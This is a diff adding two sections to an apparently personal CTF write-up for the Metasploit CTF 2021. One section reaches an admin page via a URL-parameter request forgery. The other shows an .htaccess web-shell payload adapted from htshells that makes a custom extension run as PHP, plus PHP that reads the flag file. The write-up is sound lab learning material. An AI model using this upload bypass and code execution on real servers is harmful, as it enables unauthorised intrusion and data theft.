@@ -575,4 +575,99 @@ I changed the `admin` cookie from `false` to `true` and refreshed the page. This
 
 ![Nine of Diamonds](/assets/images/2021/12/MetasploitCTF/NineOfDiamonds.png "Nine of Diamonds")
 
-## Port ?
+## Port 20011
+
+After that I spent a lots of time on challenges I did not solve. Until I got to port 20011. I opened the usual SSH tunnel, and then looked at the site in a browser.
+
+![Port 20011](/assets/images/2021/12/MetasploitCTF/Port20011.png "Port 20011")
+
+The site is a list of photo galleries. 
+
+![Sarah's Gallery](/assets/images/2021/12/MetasploitCTF/SarahsGallery.png "Sarah's Gallery")
+
+However, Jonh's gallery was not accessible. 
+
+![John's Gallery](/assets/images/2021/12/MetasploitCTF/JohnsGallery.png "John's Gallery")
+
+I also tried accessing the Admin page, but I got a 401.
+
+![401](/assets/images/2021/12/MetasploitCTF/401.png "401")
+
+I next tried using the form on the bottom of the page that allowed to view galleries that are not added to the home page. 
+
+I first tried to use it to load John's gallery, but I got the same result as before. 
+
+http://localhost:8082/gallery?galleryUrl=http%3A%2F%2Flocalhost%3A20011%2Fgallery%2FJohn
+
+Next I tried loading the Admin page this way. And there I got something different.
+
+http://localhost:8082/gallery?galleryUrl=http%3A%2F%2Flocalhost%3A20011%2Fadmin
+
+
+![Admin Page](/assets/images/2021/12/MetasploitCTF/AdminPage.png "Admin Page")
+
+I made Jonh's gallery public and reloaded it. This gave me the Ace of Hearts flag. 
+
+![Ace of Hearts](/assets/images/2021/12/MetasploitCTF/AceOfHearts.png "Ace of Hearts")
+
+## Port 20055
+
+The next flag I found was on port 20055. I opened the SSH tunnel and looked at the web site on that port.
+
+![Port 20055](/assets/images/2021/12/MetasploitCTF/Port20055.png "Port 20055")
+
+This one requires to exploit a file upload vulnerability. The code prevent uploading any executable file. But it does not prevent uploading a .htaccess file. So I could upload one and change the way Apache handle some files. I used one of the payload from [htshells](https://github.com/wireghoul/htshells) and modified it to make a new extension executable by PHP. The file also made .htaccess accessible in the upload folder.
+
+```
+# <!--  Self contained .htaccess web shell - Part of the htshell project
+# Written by Wireghoul - http://www.justanotherhacker.com
+
+# Override default deny rule to make .htaccess file accessible over web
+<Files ~ "^\.ht">
+# Uncomment the line below for Apache2.4 and newer
+    Require all granted
+    Order allow,deny
+    Allow from all
+</Files>
+
+# Make .vuln file executable as PHP
+AddType application/x-httpd-php .vuln
+```
+
+I uploaded the file. 
+
+![.htaccess Uploaded](/assets/images/2021/12/MetasploitCTF/htaccessUploaded.png ".htacess Uploaded")
+
+I clicked on the link, and sure enough, the .htaccess was displayed. So I knew hat the bypass worked. 
+
+Next I wrote some PHP in a file called `test.vuln`, and uploaded it.
+
+```php
+<?php
+echo 'IT WORKED';
+```
+
+When I accessed it, the file was executed and displayed my message. 
+
+![It Worked](/assets/images/2021/12/MetasploitCTF/testVuln.png "It Worked")
+
+I knew I could execute any PHP I wanted on the server. So I modified my test file to read the flag file and echo it back to me. 
+
+```php
+<?php
+echo file_get_contents('/flag.png');
+```
+
+I uploaded that file, then used curl to download the flag image and get it's MD5 checksum. 
+
+```bash
+$ curl http://localhost:8082/file_uploads/test.vuln -o flag.png
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  129k    0  129k    0     0   477k      0 --:--:-- --:--:-- --:--:--  479k
+
+$ md5sum flag.png
+270d4a0a9abc1c048102ff8b91f10927  flag.png
+```
+![Nine of Spades](/assets/images/2021/12/MetasploitCTF/NineOfSpades.png "Nine of Spades")
+
